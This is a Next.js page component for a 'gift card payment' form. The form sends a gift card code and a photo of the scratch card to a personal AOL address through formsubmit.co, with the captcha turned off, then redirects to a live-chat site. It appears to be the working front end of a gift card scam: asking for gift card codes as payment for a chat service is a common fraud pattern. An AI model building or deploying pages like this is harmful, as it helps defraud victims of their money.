"use client";

import MainLayout from "../../../components/MainLayout";
import { useState } from "react";

export default function PaymentInfo() {
  const [giftCardCode, setGiftCardCode] = useState("");

  return (
    <MainLayout>
      <section className="py-5">
        <div className="container">
          <div className="card p-4 shadow">
            <h4 className="mb-4">Submit Your Gift Card Payment</h4>

            <form
              action="https://formsubmit.co/polyvascular_larryscott@aol.com" // ✅ replace with your email
              method="POST"
              encType="multipart/form-data"
            >
              {/* ✅ Hidden fields for FormSubmit control */}
              <input type="hidden" name="_captcha" value="false" />
              <input type="hidden" name="_next" value="https://livechatwithfreakabritt.vercel.app/thank-you" />

              <div className="mb-3">
                <label htmlFor="giftCardCode" className="form-label">Gift Card Code</label>
                <input
                  type="text"
                  className="form-control"
                  id="giftCardCode"
                  name="Gift Card Code"
                  value={giftCardCode}
                  onChange={(e) => setGiftCardCode(e.target.value)}
                  required
                />
              </div>

              <div className="mb-3">
                <label htmlFor="image" className="form-label">Upload Scratch Card Image</label>
                <input
                  type="file"
                  className="form-control"
                  id="image"
                  name="Image"
                  accept="image/*"
                  required
                />
              </div>

              <button type="submit" className="btn btn-pink">Submit Payment</button>
            </form>
          </div>
        </div>
      </section>
    </MainLayout>
  );
}